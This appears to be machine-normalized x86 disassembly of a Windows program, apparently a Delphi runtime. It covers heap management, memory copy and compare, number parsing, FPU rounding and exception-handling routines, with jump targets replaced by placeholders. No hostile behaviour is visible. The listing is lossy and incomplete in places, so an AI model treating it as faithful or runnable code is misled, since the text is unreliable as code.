mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_4039d4
jmp r-xdata
sub_4022b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_402442
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a34
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401390
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401398
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_4039d4
jmp r-xdata
call sub_401ec8
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401bd8
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e40
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401bd8
sub_402454
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401ec8
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401bd8
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_401fcc
test al al
je r-xdata
call sub_401bd8
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401c9c
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e40
jmp r-xdata
sub_402630
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4026e1
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a34
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_402454
test al al
je r-xdata
push rw-data
call sub_401390
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_402120
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028f0
mov eax ebx
call sub_4022b0
retn
push rw-data
call sub_401398
sub_4026f4
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402850
sub_402714
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402850
sub_402734
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402850
mov [ ecx ] eax
mov al 0x2
jmp sub_402850
retn
mov [ ecx ] eax
retn
sub_4027c4
push ebx
push esi
call sub_405e88
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_405e88
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_405e88
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_402804
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_405e88
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4027f8
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_40288c
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4028f0
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_402954
fld st0
sub esp 0x4
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
frndint
fwait
fldcw [ esp ]
add esp 0x4
fsubp st1
retn
sub_402984
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_4029c4
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_40287c
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402a18
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_40287c
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_40287c
jmp r-xdata
sub_402a70
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028f0
pop ebx
retn
mov ecx ebx
sub_402a8c
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402b10
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402b80
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402ba0
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402c80
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402cc0
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402d73 ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402d73 ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402d73
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_402fac
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_402fdc
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4012ec
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_40304d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012e4
retn
sub_4030d8
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_403180
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_4031d8
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_40491c
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_4031f8
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_405770
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_403228
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4032ac
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_4032bc
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4032b3
lea eax [ ebp - 0x8 ]
call sub_405758
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_4031f8
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_405770
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_4032bc
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_403300
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_403388
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_403340
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_403370
push eax
push ecx
mov eax [ eax ]
call sub_403340
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403ee0
call [ rw-data ]
sub_4033b8
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_403340
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_4033e0
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_403430
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
xor ecx ecx
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov cx [ esi ]
add esi 0x2
mov eax [ eax ]
mov [ edi ] al
jmp r-xdata
add esi 0x6
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
mov bx [ esi ]
add esi ebx
dec ecx
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edx [ esi + 0x2 ]
je r-xdata
sub_403470
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_4034c0
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_4034e9
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_403554
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_403590
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_4035a4
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_4035b8
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_4035d8
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_4035b8
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_40363c
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_4030a0
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_405e88
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_4035a4
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_403554
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_403768
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_4030a0
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_403554
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_405e88
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_403590
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
